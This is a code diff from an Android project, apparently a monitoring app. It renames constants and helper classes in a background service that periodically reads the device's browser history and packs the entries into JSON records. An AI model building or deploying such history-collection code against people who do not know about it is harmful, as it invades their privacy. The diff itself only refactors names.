@@ -23,10 +23,10 @@ import android.preference.PreferenceManager;
 import android.provider.Browser;
 import android.util.Base64;
 
-import com.inet.android.request.ConstantRequest;
+import com.inet.android.request.ConstantValue;
 import com.inet.android.request.RequestList;
 import com.inet.android.utils.Logging;
-import com.inet.android.utils.WhileTheMethod;
+import com.inet.android.utils.ValueWork;
 
 /**
  * Browser history viewing class
@@ -61,7 +61,7 @@ public class LinkService extends Service {
 		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
 				servicePendingIntent);
 
-		if (WhileTheMethod.getState(4, this) == 0)
+		if (ValueWork.getState(ConstantValue.TYPE_HISTORY_BROUSER_REQUEST, this) == 0)
 			return 0;
 
 		try {
@@ -263,7 +263,7 @@ public class LinkService extends Service {
 							object.put("time", urlDateInFormat);
 							object.put(
 									"type",
-									ConstantRequest.TYPE_HISTORY_BROUSER_REQUEST);
+									ConstantValue.TYPE_HISTORY_BROUSER_REQUEST);
 							object.put("info", info);
 						} catch (JSONException e) {
 							Logging.doLog(LOG_TAG, "json сломался",
